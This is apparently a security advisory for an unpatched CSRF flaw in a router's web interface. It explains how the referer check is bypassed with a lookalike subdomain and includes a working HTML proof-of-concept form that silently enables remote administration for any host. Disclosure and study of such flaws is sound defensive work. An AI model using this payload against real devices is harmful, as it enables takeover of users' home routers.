##### Overview

The web interface of the router is vulnerable to CSRF. An attacker can
perform arbitrary actions in the name of an authenticated user if that
user visits an attacker-controlled website.

##### CVSS

High 8.8 CVSS:3.0/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H

##### Details

The protection mechanism that is in place against CSRF checks if the
given "referer" header starts with "192.168.0.1". If it does, the
request is accepted.

An attacker can bypass this mechanism by prepending their domain with
this string. For example, the malicious HTML and JavaScript code could
be hosted at "192.168.0.1.example.com". Alternatively, an attack could
originate from a different IP in the internal network, eg "192.168.0.11".

##### Proof of Concept

Enable remote access:

	<html>
	  <body>
		<form action="http://192.168.0.1/cgi?2&2" method="POST"
enctype="text/plain">
		  <input type="hidden"
name="&#91;HTTP&#95;CFG&#35;0&#44;0&#44;0&#44;0&#44;0&#44;0&#35;0&#44;0&#44;0&#44;0&#44;0&#44;0&#93;0&#44;2&#13;&#10;httpRemoteEnabled"
value="1&#13;&#10;httpRemotePort&#61;7777&#13;&#10;&#91;APP&#95;CFG&#35;0&#44;0&#44;0&#44;0&#44;0&#44;0&#35;0&#44;0&#44;0&#44;0&#44;0&#44;0&#93;1&#44;1&#13;&#10;remoteHost&#61;255&#46;255&#46;255&#46;255&#13;&#10;"
/>
		  <input type="submit" value="Submit request" />
		</form>
	  </body>
	</html>

The code would be hosted at a subdomain which starts with "192.168.0.1",
eg "192.168.0.1.example.com".

##### Solution

The vendor did not fix the issue.

Users of the product can try to mitigate the issue by not visiting other
websites while being signed into the web interface and signing out as
soon as possible. Additionally, various browser plugins can be used to
try to defend against attacks.
